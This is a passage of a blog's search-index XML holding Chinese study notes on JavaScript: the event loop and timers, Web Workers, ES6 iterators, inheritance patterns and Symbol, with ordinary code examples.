title="定时器的理解"></a>定时器的理解</h4><p>JavaScript是运行于单线程环境中的，而定时器只是计划代码在未来的某个时间执行。执行的时机是不能保证的，因为在页面的生命周期中，不同时间可能有其他代码在控制JavaScript进程。在页面完成下载后的代码执行、事件处理程序、Ajax回调函数都必须使用同样的线程来执行。实际上，浏览器负责排序，指派某段代码在某个时间点运行的优先级。</p><ul><li><code>setTimeout</code>定时器对队列的工作方式是，当特定时间过去后将代码插入，异步延时执行，因此零延迟并不是意味着回调会立刻执行</li></ul><h4 id="宏任务与微任务"><a href="#宏任务与微任务" class="headerlink" title="宏任务与微任务"></a>宏任务与微任务</h4><p>宏任务和微任务都是异步任务</p><ul><li>宏任务(macro-task)：script中代码、setTimeout、setInterval、I/O、UI render</li><li>微任务(micro-task)：原生Promise（有些实现的promise将then方法放到了宏任务中），MutationObserver<br>每次执行栈的同步任务执行完毕，就回去任务队列中取出完成的异步任务，队列中又分为微任务队列和宏任务队列；每个事件循环结束后，都会先执行完微任务队列中的任务，再从宏任务队列中取出一个事件执行。</li></ul><h4 id="Web-Worker"><a href="#Web-Worker" class="headerlink" title="Web Worker"></a>Web Worker</h4><p>长时间运行的JavaScript进程会导致浏览器冻结用户界面，让人感觉屏幕“冻结”。Web Worker通过让JavaStript在后台运行解决这个问题。</p><ul><li>使用  <pre class=" language-JavaScript"><code class="language-JavaScript">var worker = new Worker("stufftodo.js");</code></pre>这会导致浏览器下载js，但是只有Worker接收到消息才会实际执行文件宏的代码</li><li>传递消息  <pre class=" language-JavaScript"><code class="language-JavaScript">worker.postMessage("start!");//可以传递任何形式的对象数据</code></pre></li><li>worker是通过<code>message</code>和<code>error</code>事件与页面通信的  <pre class=" language-JavaScript"><code class="language-JavaScript">worker.onmessage = function(event) {var data = event.data;//对数据进行处理}worker.onerror = function(event) {console.log('error: '+event.filename+"("+event.lineno+")"+event.message);}</code></pre></li><li>停止  <pre class=" language-JavaScript"><code class="language-JavaScript">worker.terminate();</code></pre></li><li>Worker全局作用域<br>Web Worker的全局对象是worker对象本身，不能访问DOM也无法通过任何方式影响页面的外观。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
            <tag> 事件循环 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES6学习之Iterator和Generator</title>
      <link href="/2018/07/29/es6-xue-xi-zhi-iterator-he-generator/"/>
      <url>/2018/07/29/es6-xue-xi-zhi-iterator-he-generator/</url>
      
        <content type="html"><![CDATA[<h4 id="Iterator（遍历器）"><a href="#Iterator（遍历器）" class="headerlink" title="Iterator（遍历器）"></a>Iterator（遍历器）</h4><ul><li><strong>定义</strong>：遍历器（Iterator）是一种接口，为各种不同的数据结构提供统一的访问机制。任何数据结构只要部署 Iterator 接口，就可以完成遍历操作（即依次处理该数据结构的所有成员）</li><li><strong>作用有三个</strong>：<ul><li>为各种数据结构，提供一个统一的、简便的访问接口</li><li>使得数据结构的成员能够按某种次序排列</li><li>ES6 创造了一种新的遍历命令for…of循环，Iterator 接口主要供for…of消费</li></ul></li><li><strong>遍历过程</strong>:<ul><li>创建一个指针对象，指向当前数据结构的起始位置</li><li>第一次调用指针对象的next方法，可以将指针指向数据结构的第一个成员</li><li>每一次调用next方法，都会返回数据结构的当前成员的信息。具体来说，就是返回一个包含value和done两个属性的对象。其中，value属性是当前成员的值，done属性是一个布尔值，表示遍历是否结束</li></ul></li><li>原生具备 Iterator 接口的数据结构如下:Array、Map、Set、String、TypedArray、函数的 arguments 对象、NodeList 对象</li><li>接口部署例子：<pre class=" language-JavaScript"><code class="language-JavaScript">let obj = {  data: [ 'hello', 'world' ],  [Symbol.iterator]() {    const self = this;    let index = 0;    return {      next() {        if (index < self.data.length) {          return {            value: self.data[index++],            done: false          };        } else {          return { value: undefined, done: true };        }      }    };  }};</code></pre></li><li>场景</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS中的继承</title>
      <link href="/2018/07/29/js-zhong-de-ji-cheng/"/>
      <url>/2018/07/29/js-zhong-de-ji-cheng/</url>
      
        <content type="html"><![CDATA[<p>实现继承主要是依靠原型链来实现的</p><h4 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">SuperType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>property <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span>SuperType<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>getSuperValue <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>property<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">SubType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>subproperty <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//继承</span>SubType<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SuperType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>SubType<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>getSubValue <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>subproperty<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>通过将<strong>父类的实例</strong>赋值给<strong>子类的原型对象</strong>实现</li><li>instance指向SubType的原型，SubType的原型指向SuperType的原型，注意instance.constructor指向SuperType，因为SubType.prototype中的constructor被重写</li><li><strong>原型搜索机制</strong>：当读取模式访问一个实例属性时，首先会在实例中搜索该属性，如果没有则会继续搜索示例的原型。在通过原型链实现继承的情况下，搜索过程就得以沿着原型链继续向上</li><li>原型和实例的关系确定<ul><li><code>instance instanceOf Object</code></li><li><code>SubType.prototype.isPrototypeOf(instance)</code></li></ul></li><li>注意：<ul><li>原型被替换，SubType的原型方法要在用SuperType的实例替换原型后再定义</li><li>通过原型链实现继承时不能用对象字面量创建原型方法</li></ul></li><li><strong>问题</strong>：<ul><li>包含引用类型的原型属性会被所有实例共享</li><li>不能给超类型的构造函数传递参数</li></ul></li></ul><h4 id="构造继承（constructor-stealing）"><a href="#构造继承（constructor-stealing）" class="headerlink" title="构造继承（constructor stealing）"></a>构造继承（constructor stealing）</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">SuperType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>colors <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"red"</span><span class="token punctuation">,</span> <span class="token string">"green"</span><span class="token punctuation">,</span> <span class="token string">"yellow"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">SubType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  SuperType<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token string">"Jane"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>instance<span class="token punctuation">.</span>colors<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance<span class="token punctuation">.</span>colors<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//red,green,yellow,black</span><span class="token keyword">var</span> instance2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance<span class="token punctuation">.</span>colors<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//red,green,yellow</span></code></pre><ul><li>通过使用<code>apply</code>和<code>call</code>方法，在子类型构造函数的内部调用超类型构造函数</li><li><strong>问题</strong>：方法都在构造器中定义，函数无法复用</li><li>构造函数生成实例的执行过程：使用了构造函数，并且new 构造函数(),后台会隐式执行new Object()创建对象; 将构造函数的作用域给新对象，而函数体内的this就代表新对象对象；执行构造函数的代码；返回新对象（后台直接返回）;</li></ul><h4 id="组合继承（combination-inheritance）"><a href="#组合继承（combination-inheritance）" class="headerlink" title="组合继承（combination inheritance）"></a>组合继承（combination inheritance）</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">SuperType</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>colors <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"red"</span><span class="token punctuation">,</span><span class="token string">"blue"</span><span class="token punctuation">,</span><span class="token string">"green"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>SuperType<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>sayName <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">SubType</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>  SuperType<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span><span class="token punctuation">}</span>SubType<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SuperType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>SubType<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> SubType<span class="token punctuation">;</span>SubType<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>sayAge <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">var</span> instance1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubType</span><span class="token punctuation">(</span><span class="token string">"Jane"</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">)</span><span class="token punctuation">;</span>instance1<span class="token punctuation">.</span>colors<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance1<span class="token punctuation">.</span>colors<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//red, blue, green ,black</span>instance1<span class="token punctuation">.</span><span class="token function">sayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Jane</span>instance1<span class="token punctuation">.</span><span class="token function">sayAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//29</span><span class="token keyword">var</span> instance2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubType</span><span class="token punctuation">(</span><span class="token string">"Susie"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance2<span class="token punctuation">.</span>colors<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//red, blue, green</span></code></pre><ul><li>结合原型继承和组合继承：使用原型链实现对原型属性和方法的继承，而通过构造函数来实现对实例属性的继承</li></ul><h4 id="原型式继承（实例继承）"><a href="#原型式继承（实例继承）" class="headerlink" title="原型式继承（实例继承）"></a>原型式继承（实例继承）</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">object</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  f<span class="token punctuation">.</span>prototype <span class="token operator">=</span> o<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//ES5引入规范化的原型继承</span><span class="token keyword">var</span> newPerson1 <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> newPerson2 <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span> <span class="token punctuation">{</span>  name <span class="token punctuation">:</span> <span class="token punctuation">{</span>    value<span class="token punctuation">:</span> <span class="token string">"Greg"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><ul><li>在object函数的内部，先创建一个临时性的构造函数，然后传入的对象作为这个构造函数的原型，最后返回这个临时类型的新实例</li></ul><h4 id="寄生式继承（parasitic）"><a href="#寄生式继承（parasitic）" class="headerlink" title="寄生式继承（parasitic）"></a>寄生式继承（parasitic）</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">createAnother</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> clone <span class="token operator">=</span> <span class="token function">object</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">;</span>  clone<span class="token punctuation">.</span>sayHai <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> clone<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>和工厂模式类似，创建一个仅用于封装继承过程的函数，该函数内部以某种方式来增强对象</li><li><strong>问题</strong>：不能函数复用</li></ul><h4 id="寄生组合式继承"><a href="#寄生组合式继承" class="headerlink" title="寄生组合式继承"></a>寄生组合式继承</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">inheritPrototype</span><span class="token punctuation">(</span>SubType<span class="token punctuation">,</span> SuperType<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> prototype <span class="token operator">=</span> <span class="token function">object</span><span class="token punctuation">(</span>SuperType<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>  prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> SubType<span class="token punctuation">;</span>  SubType<span class="token punctuation">.</span>prototype <span class="token operator">=</span> prototype<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="ES6中Class的继承"><a href="#ES6中Class的继承" class="headerlink" title="ES6中Class的继承"></a>ES6中Class的继承</h4><ul><li><strong>Class</strong>：<ul><li>类相当于实例的原型，所有在类中定义的方法，都会被实例继承。如果在一个方法前，加上static关键字，就表示该方法不会被实例继承，而是直接通过类来调用，这就称为“静态方法”</li><li>类的所有方法都定义在类的prototype属性上面;在类的实例上面调用方法，其实就是调用原型上的方法</li><li>类的内部所有定义的方法，都是不可枚举的</li><li>如果没有显式定义，一个空的constructor方法会被默认添加</li><li>实例的属性除非显式定义在其本身（即定义在this对象上），否则都是定义在原型上（即定义在class上）</li><li>实例属性除了定义在constructor()方法里面的this上面，也可以定义在类的最顶层</li><li>在“类”的内部可以使用get和set关键字，对某个属性设置存值函数和取值函数，拦截该属性的存取行为<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token keyword">get</span> <span class="token function">prop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token string">'getter'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">set</span> <span class="token function">prop</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setter: '</span><span class="token operator">+</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> inst <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>inst<span class="token punctuation">.</span>prop <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// setter: 123</span>inst<span class="token punctuation">.</span>prop<span class="token comment" spellcheck="true">// 'getter</span></code></pre></li><li>实现<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Point</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//用构造方法代替ES5的构造函数</span><span class="token function">constructor</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//不需要加上function关键字，方法之间不需要逗号分隔</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token string">'('</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">+</span> <span class="token string">', '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">+</span> <span class="token string">')'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>Point <span class="token operator">===</span> Point<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor<span class="token comment" spellcheck="true">//true</span></code></pre></li></ul></li><li><strong>继承</strong>：Class 可以通过extends关键字实现继承<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">ColorPoint</span> <span class="token keyword">extends</span> <span class="token class-name">Point</span> <span class="token punctuation">{</span><span class="token function">constructor</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> color<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">super</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 调用父类的constructor(x, y)</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 调用父类的toString()</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li>子类必须在constructor方法中调用super方法，否则新建实例时会报错。这是因为子类自己的this对象，必须先通过父类的构造函数完成塑造，得到与父类同样的实例属性和方法，然后再对其进行加工，加上子类自己的实例属性和方法。如果不调用super方法，子类就得不到this对象</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES6学习之Symbol</title>
      <link href="/2018/07/28/es6-xue-xi-zhi-symbol/"/>
      <url>/2018/07/28/es6-xue-xi-zhi-symbol/</url>
      
        <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><ul><li>ES6 引入了一种新的原始数据类型Symbol，表示<strong>独一无二的值</strong>。它是 JavaScript 语言的第七种数据类型，前六种是：undefined、null、布尔值（Boolean）、字符串（String）、数值（Number）、对象（Object）</li><li>Symbol 值通过Symbol函数生成；Symbol函数前不能使用new命令</li><li>Symbol 值不是对象，所以不能添加属性。基本上，它是一种类似于字符串的数据类型</li><li>Symbol 值不能与其他类型的值进行运算，会报错</li><li>Symbol 值可以显式转为字符串;Symbol值也可以转为布尔值<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> sym <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'My symbol'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">String</span><span class="token punctuation">(</span>sym<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 'Symbol(My symbol)'</span>sym<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 'Symbol(My symbol)'</span></code></pre></li></ul><h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><ul><li>Symbol 值作为对象<strong>属性名</strong>时，不能用点运算符;在对象的内部，使用 Symbol 值定义属性时，Symbol 值必须放在方括号之中<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//点运算符后面总是字符串，所以不会读取mySymbol作为标识名所指代的那个值，导致a的属性名实际上是一个字符串，而不是一个 Symbol 值</span><span class="token keyword">const</span> mySymbol <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>a<span class="token punctuation">.</span>mySymbol <span class="token operator">=</span> <span class="token string">'Hello!'</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>mySymbol<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">// undefined</span>a<span class="token punctuation">[</span><span class="token string">'mySymbol'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">//hello</span><span class="token keyword">let</span> s <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>obj<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><strong>属性名的遍历</strong>：Symbol 作为属性名，该属性不会出现在<code>for...in</code>、<code>for...of</code>循环中，也不会被<code>Object.keys()</code>、<code>Object.getOwnPropertyNames()</code>、<code>JSON.stringify()</code>返回；<ul><li><code>Object.getOwnPropertySymbols</code>方法返回一个数组，成员是当前对象的所有用作属性名的 Symbol 值<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> foo<span class="token punctuation">,</span> <span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token string">"foobar"</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 无输出</span><span class="token punctuation">}</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// []</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertySymbols</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// [Symbol(foo)]</span></code></pre></li><li><code>Reflect.ownKeys</code>：方法可以返回所有类型的键名，包括常规键名和 Symbol 键名<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'my_key'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token keyword">enum</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span>  nonEnum<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span>Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//  ["enum", "nonEnum", Symbol(my_key)]</span></code></pre></li></ul></li><li><strong>私有变量</strong>：由于以 Symbol 值作为名称的属性，不会被常规方法遍历得到。我们可以利用这个特性，为对象定义一些非私有的、但又希望只用于内部的方法<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> size <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'size'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Collection</span> <span class="token punctuation">{</span>  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">add</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> item<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">static</span> <span class="token function">sizeOf</span><span class="token punctuation">(</span>instance<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> instance<span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4></li><li><code>Symbol.for</code>：接受一个字符串作为参数，然后搜索有没有以该参数作为名称的 Symbol 值。如果有，就返回这个 Symbol 值，否则就新建并返回一个以该字符串为名称的 Symbol 